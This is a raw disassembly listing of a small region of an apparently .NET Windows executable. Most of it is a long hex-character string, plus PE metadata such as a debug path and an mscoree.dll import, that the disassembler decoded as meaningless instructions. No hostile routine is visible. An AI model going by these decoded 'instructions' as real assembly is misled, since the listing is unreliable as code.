  4049c1:	xor    dh,BYTE PTR [ebx]
  4049c3:	xor    dh,BYTE PTR gs:[edi]
  4049c6:	xor    edi,DWORD PTR [eax]
  4049c8:	xor    al,0x30
  4049ca:	arpl   WORD PTR ss:[edx],si
  4049cd:	xor    DWORD PTR [ebp+0x35],esp
  4049d0:	bound  edi,QWORD PTR [eax]
  4049d2:	xor    BYTE PTR [ecx],dh
  4049d4:	xor    eax,0x62613235
  4049d9:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  4049dd:	xor    BYTE PTR [ecx+0x36],ah
  4049e0:	xor    eax,0x35333261
  4049e5:	xor    BYTE PTR gs:[eax],dh
  4049e8:	xor    DWORD PTR [ecx+0x63],esp
  4049eb:	cmp    DWORD PTR [ecx+0x64],esp
  4049ee:	arpl   WORD PTR [edx],si
  4049f0:	xor    eax,0x38643266
  4049f5:	xor    DWORD PTR [ecx],esi
  4049f7:	bound  esi,QWORD PTR gs:[eax]
  4049fa:	cmp    DWORD PTR [ecx+edi*1],esi
  4049fd:	ss popa 
  4049ff:	xor    al,0x63
  404a01:	ss popa 
  404a03:	xor    eax,0x36346439
  404a08:	xor    DWORD PTR [ecx],edi
  404a0a:	xor    eax,0x36633938
  404a0f:	cmp    DWORD PTR [esi+0x35],esp
  404a12:	bound  esp,QWORD PTR [ecx+0x66]
  404a15:	xor    BYTE PTR [ebx+0x34],ah
  404a18:	xor    DWORD PTR [edi],esi
  404a1a:	cmp    DWORD PTR [ecx+0x34],esp
  404a1d:	aaa    
  404a1e:	xor    esi,DWORD PTR [ecx]
  404a20:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  404a24:	xor    eax,0x64633535
  404a29:	xor    BYTE PTR [eax],dh
  404a2b:	ss popa 
  404a2d:	arpl   WORD PTR [ebx+0x38],sp
  404a30:	bound  esi,QWORD PTR ds:0x66393539
  404a36:	xor    ah,BYTE PTR [edx+0x64]
  404a39:	ss xor DWORD PTR gs:[eax],esi
  404a3d:	xor    esi,DWORD PTR gs:[esi]
  404a40:	xor    BYTE PTR [ebx+0x33],ah
  404a43:	xor    al,0x35
  404a45:	xor    esi,DWORD PTR [edi]
  404a47:	popa   
  404a48:	xor    DWORD PTR [edx+esi*1+0x36],esp
  404a4c:	ss fs popa 
  404a4f:	cmp    BYTE PTR [eax],dh
  404a51:	cmp    BYTE PTR ds:0x35363538,dh
  404a57:	cmp    BYTE PTR [ebx],dh
  404a59:	arpl   WORD PTR [eax],di
  404a5b:	xor    eax,0x64313864
  404a60:	popa   
  404a61:	aaa    
  404a62:	xor    sp,WORD PTR [ebp+0x63]
  404a66:	xor    BYTE PTR [ecx],dh
  404a68:	gs cmp DWORD PTR fs:0x35633436,esi
  404a70:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  404a74:	fs aaa 
  404a76:	xor    DWORD PTR [ebx],esi
  404a78:	arpl   WORD PTR [eax+esi*1+0x31],sp
  404a7c:	aaa    
  404a7d:	xor    ah,BYTE PTR [ebx+0x38]
  404a80:	xor    dh,BYTE PTR gs:[ebx]
  404a83:	popa   
  404a84:	xor    DWORD PTR [eax],esi
  404a86:	data16 xor BYTE PTR [edx],dh
  404a89:	xor    edi,DWORD PTR [ecx]
  404a8b:	bound  edi,QWORD PTR [eax]
  404a8d:	xor    BYTE PTR [ebx+0x39],ah
  404a90:	bound  esi,QWORD PTR ss:[eax]
  404a93:	aaa    
  404a94:	aaa    
  404a95:	xor    esi,DWORD PTR [esi]
  404a97:	xor    ax,0x3864
  404a9b:	bound  esi,QWORD PTR [eax]
  404a9d:	xor    dh,BYTE PTR [edx]
  404a9f:	xor    eax,0x34613234
  404aa4:	gs aaa 
  404aa6:	xor    al,0x32
  404aa8:	xor    eax,0x66356131
  404aad:	xor    al,0x33
  404aaf:	xor    bh,BYTE PTR [eax]
  404ab1:	xor    dh,BYTE PTR [ebx+esi*1]
  404ab4:	xor    DWORD PTR [eax],edi
  404ab6:	bound  esi,QWORD PTR [ebx]
  404ab8:	xor    eax,0x35613933
  404abd:	popa   
  404abe:	xor    BYTE PTR [eax],bh
  404ac0:	aaa    
  404ac1:	data16 cmp BYTE PTR [ebp+0x35],ah
  404ac5:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  404ac9:	xor    DWORD PTR [ebx],esi
  404acb:	xor    eax,0x61633966
  404ad0:	xor    al,0x37
  404ad2:	xor    sp,WORD PTR [edx+0x62]
  404ad6:	xor    ah,BYTE PTR [ebp+0x31]
  404ad9:	xor    BYTE PTR [ecx+0x66],ah
  404adc:	data16 xor BYTE PTR [ecx+0x66],ah
  404ae0:	xor    BYTE PTR [eax],bh
  404ae2:	xor    al,0x39
  404ae4:	xor    eax,0x62663430
  404ae9:	aaa    
  404aea:	arpl   WORD PTR [ebp+0x61],sp
  404aed:	xor    esp,DWORD PTR [esi+0x66]
  404af0:	xor    DWORD PTR [ecx],edi
  404af2:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  404af6:	fs xor BYTE PTR gs:[ebp+0x64],ah
  404afb:	popa   
  404afc:	fs ss xor al,0x63
  404b00:	cmp    BYTE PTR ss:[ebp+0x66],ah
  404b04:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  404b09:	xor    eax,0x30336436
  404b0e:	xor    ah,BYTE PTR [ecx+0x64]
  404b11:	xor    eax,0x36646635
  404b16:	cmp    BYTE PTR gs:[eax],dh
  404b19:	xor    si,WORD PTR [eax]
  404b1c:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  404b20:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  404b25:	cmp    DWORD PTR gs:0x38353633,esi
  404b2c:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  404b34:	bound  esi,QWORD PTR ds:0x63363366
  404b3a:	xor    eax,0x66653234
  404b3f:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  404b44:	data16 cmp BYTE PTR [eax],bh
  404b47:	cmp    BYTE PTR ds:0x33643833,dh
  404b4d:	aaa    
  404b4e:	xor    al,0x63
  404b50:	xor    WORD PTR gs:[eax],si
  404b54:	ss popa 
  404b56:	arpl   WORD PTR [esi+0x37],sp
  404b59:	cmp    DWORD PTR fs:[ebx],esi
  404b5c:	popa   
  404b5d:	xor    al,0x34
  404b5f:	xor    al,0x35
  404b61:	arpl   WORD PTR [ebx],si
  404b63:	arpl   WORD PTR [edi],si
  404b65:	xor    esp,DWORD PTR [ebx+0x64]
  404b68:	cmp    DWORD PTR [ecx],esi
  404b6a:	xor    DWORD PTR [esi+0x30],esp
  404b6d:	xor    eax,0x61613137
  404b72:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  404b77:	fs popa 
  404b79:	xor    DWORD PTR [edx],esi
  404b7b:	bound  esi,QWORD PTR [ecx]
  404b7d:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  404b81:	arpl   WORD PTR [ebx],si
  404b83:	aaa    
  404b84:	xor    eax,0x813362
  404b89:	popa   
  404b8a:	xor    eax,0x36363861
  404b8f:	xor    DWORD PTR gs:[ebp+0x65],esp
  404b93:	xor    DWORD PTR [eax],edi
  404b95:	data16 cmp BYTE PTR ss:[eax],dh
  404b99:	aaa    
  404b9a:	ss cmp BYTE PTR ss:[edx],dh
  404b9e:	xor    BYTE PTR [ecx],bh
  404ba0:	xor    sp,WORD PTR [edx+0x31]
  404ba4:	xor    DWORD PTR [edx],esi
  404ba6:	xor    esi,DWORD PTR [esi]
  404ba8:	popa   
  404ba9:	arpl   WORD PTR [ebp+0x35],sp
  404bac:	xor    dh,BYTE PTR gs:[ecx]
  404baf:	xor    WORD PTR [ecx],si
  404bb2:	aaa    
  404bb3:	cmp    BYTE PTR [eax],dh
  404bb5:	xor    esp,DWORD PTR [ecx+0x33]
  404bb8:	xor    DWORD PTR [ebx+esi*1],esi
  404bbb:	popa   
  404bbc:	bound  esp,QWORD PTR [edx+0x31]
  404bbf:	xor    dh,BYTE PTR [esi]
  404bc1:	fs xor BYTE PTR fs:[ebx],dh
  404bc5:	xor    eax,0x32643764
  404bca:	data16 cmp BYTE PTR [edi],dh
  404bcd:	bound  esi,QWORD PTR ss:[esi]
  404bd0:	cmp    DWORD PTR [ebx],esi
  404bd2:	cmp    BYTE PTR [ecx+0x61],ah
  404bd5:	data16 xor ah,BYTE PTR [ebp+0x65]
  404bd9:	xor    esi,DWORD PTR [ecx+esi*1]
  404bdc:	xor    al,0x64
  404bde:	xor    eax,0x64303234
  404be3:	aaa    
  404be4:	xor    eax,0x31323633
  404be9:	xor    al,0x30
  404beb:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  404bef:	xor    al,0x61
  404bf1:	xor    al,0x39
  404bf3:	arpl   WORD PTR [eax+edi*1],si
  404bf6:	arpl   WORD PTR ss:[ebp+0x31],sp
  404bfa:	xor    esi,DWORD PTR [ebx+esi*1]
  404bfd:	xor    BYTE PTR [eax],dh
  404bff:	popa   
  404c00:	xor    dh,BYTE PTR [ecx]
  404c02:	xor    BYTE PTR [esi],dh
  404c04:	popa   
  404c05:	bound  esi,QWORD PTR fs:[esi]
  404c08:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  404c0c:	xor    esi,DWORD PTR [ebx]
  404c0e:	xor    eax,0x65663039
  404c13:	data16 cmp BYTE PTR [ecx+0x64],ah
  404c17:	xor    eax,0x63333463
  404c1c:	bound  esp,QWORD PTR [ecx+0x38]
  404c1f:	xor    dh,BYTE PTR [edx]
  404c21:	cmp    DWORD PTR [eax],esi
  404c23:	arpl   WORD PTR fs:[ecx+edi*1],si
  404c27:	xor    eax,0x66653033
  404c2c:	data16 cmp BYTE PTR fs:[esi],dh
  404c30:	xor    eax,0x39643332
  404c35:	xor    al,0x38
  404c37:	xor    esp,DWORD PTR [ebx+0x30]
  404c3a:	xor    BYTE PTR [esi+0x34],ah
  404c3d:	xor    eax,0x34666138
  404c42:	cmp    BYTE PTR ss:[ecx],bh
  404c45:	xor    BYTE PTR [eax],dh
  404c47:	xor    esi,DWORD PTR [esi]
  404c49:	bound  esi,QWORD PTR [eax]
  404c4b:	xor    ah,BYTE PTR gs:[ebx+0x36]
  404c4f:	xor    DWORD PTR [eax+esi*1+0x37],esp
  404c53:	aaa    
  404c54:	fs aaa 
  404c56:	bound  sp,DWORD PTR [ecx+0x63]
  404c5a:	xor    al,0x36
  404c5c:	aaa    
  404c5d:	popa   
  404c5e:	xor    eax,0x62653630
  404c63:	popa   
  404c64:	xor    bh,BYTE PTR [ecx]
  404c66:	gs xor al,0x36
  404c69:	aaa    
  404c6a:	popa   
  404c6b:	cmp    BYTE PTR [edi],dh
  404c6d:	xor    DWORD PTR [ecx],edi
  404c6f:	cmp    BYTE PTR [edx+0x30],ah
  404c72:	xor    eax,0x34376333
  404c77:	cmp    DWORD PTR [ecx+0x61],esp
  404c7a:	xor    ah,BYTE PTR [ecx+0x34]
  404c7d:	xor    bh,BYTE PTR fs:[eax]
  404c80:	xor    al,0x30
  404c82:	arpl   WORD PTR [edi],si
  404c84:	cmp    BYTE PTR [eiz*2+0x6436],dh
  404c8b:	push   ds
  404c8c:	add    DWORD PTR [eax],eax
  404c8e:	add    DWORD PTR [eax],eax
  404c90:	push   esp
  404c91:	add    dl,BYTE PTR [esi]
  404c93:	push   edi
  404c94:	jb     0x404cf7
  404c96:	jo     0x404ce6
  404c98:	outs   dx,DWORD PTR ds:[esi]
  404c99:	outs   dx,BYTE PTR ds:[esi]
  404c9a:	inc    ebp
  404c9b:	js     0x404d00
  404c9d:	gs jo  0x404d14
  404ca0:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  404ca7:	ja     0x404d1c
  404ca9:	add    DWORD PTR [eax],ecx
  404cab:	add    DWORD PTR [eax],eax
  404cad:	add    al,BYTE PTR [eax]
  404caf:	add    BYTE PTR [eax],al
  404cb1:	add    BYTE PTR [eax],al
  404cb3:	or     BYTE PTR [ecx],al
  404cb5:	add    BYTE PTR [eax],cl
	...
  404cbf:	add    BYTE PTR [ebx-0x21],dl
  404cc2:	adc    DWORD PTR [eax+0x0],edx
  404cc5:	add    BYTE PTR [eax],al
  404cc7:	add    BYTE PTR [edx],al
  404cc9:	add    BYTE PTR [eax],al
  404ccb:	add    BYTE PTR [ecx+eax*1],bl
  404cce:	add    BYTE PTR [eax],al
  404cd0:	fmul   DWORD PTR [eax+eax*1+0x0]
  404cd4:	fsubr  DWORD PTR [esi]
  404cd6:	add    BYTE PTR [eax],al
  404cd8:	push   edx
  404cd9:	push   ebx
  404cda:	inc    esp
  404cdb:	push   ebx
  404cdc:	pushw  ds
  404cde:	sub    esp,DWORD PTR [ebx+0x4643ccd4]
  404ce4:	xor    BYTE PTR [edi-0x44],0x3f
  404ce8:	xlat   BYTE PTR ds:[ebx]
  404ce9:	adc    bl,BYTE PTR [edi+edi*1]
  404cec:	add    DWORD PTR [eax],eax
  404cee:	add    BYTE PTR [eax],al
  404cf0:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  404cf5:	outs   dx,BYTE PTR ds:[esi]
  404cf6:	popa   
  404cf7:	jb     0x404d62
  404cf9:	gs jae 0x404d58
  404cfc:	dec    ecx
  404cfd:	outs   dx,BYTE PTR ds:[esi]
  404cfe:	je     0x404d65
  404d00:	jb     0x404d6f
  404d02:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x73765c65
  404d0b:	gs je  0x404d6a
  404d0e:	je     0x404d75
  404d10:	jae    0x404d86
  404d12:	popa   
  404d13:	outs   dx,BYTE PTR gs:[si]
  404d16:	je     0x404d88
  404d18:	jb     0x404d89
  404d1a:	arpl   WORD PTR [ebp+0x73],sp
  404d1d:	jae    0x404d52
  404d1f:	xor    ch,BYTE PTR [esi]
  404d21:	arpl   WORD PTR [ebx+0x70],si
  404d24:	jb     0x404d95
  404d26:	push   0x5f
  404d28:	pop    edi
  404d29:	xor    DWORD PTR [edx],esi
  404d2b:	cmp    DWORD PTR [ebx],esi
  404d2d:	cmp    BYTE PTR [ecx+edi*1],dh
  404d30:	xor    BYTE PTR ss:[ecx],dh
  404d33:	pop    esp
  404d34:	outs   dx,DWORD PTR ds:[esi]
  404d35:	bound  ebp,QWORD PTR [edx+0x72]
  404d38:	pop    esp
  404d39:	js     0x404d73
  404d3b:	ss pop esp
  404d3d:	push   ecx
  404d3e:	push   esp
  404d3f:	inc    ecx
  404d40:	outs   dx,BYTE PTR gs:[si]
  404d43:	je     0x404d78
  404d45:	xor    ch,BYTE PTR [esi]
  404d47:	jo     0x404dad
  404d49:	bound  eax,QWORD PTR [eax]
	...
  404df3:	add    BYTE PTR [esi+ecx*2],bl
	...
  404dfe:	add    BYTE PTR [eax],al
  404e00:	ds dec esi
  404e02:	add    BYTE PTR [eax],al
  404e04:	add    BYTE PTR [eax],ah
	...
  404e1a:	add    BYTE PTR [eax],al
  404e1c:	xor    BYTE PTR [esi+0x0],cl
	...
  404e2f:	add    BYTE PTR [eax],al
  404e31:	add    BYTE PTR [edi+0x43],bl
  404e34:	outs   dx,DWORD PTR ds:[esi]
  404e35:	jb     0x404e7c
  404e37:	js     0x404e9e
  404e39:	dec    ebp
  404e3a:	popa   
  404e3b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  404e42:	jb     0x404ea9
  404e44:	gs cs fs ins BYTE PTR es:[edi],dx
  404e48:	ins    BYTE PTR es:[edi],dx
  404e49:	add    BYTE PTR [eax],al
  404e4b:	add    BYTE PTR [eax],al
  404e4d:	add    bh,bh
  404e4f:	and    eax,0x402000
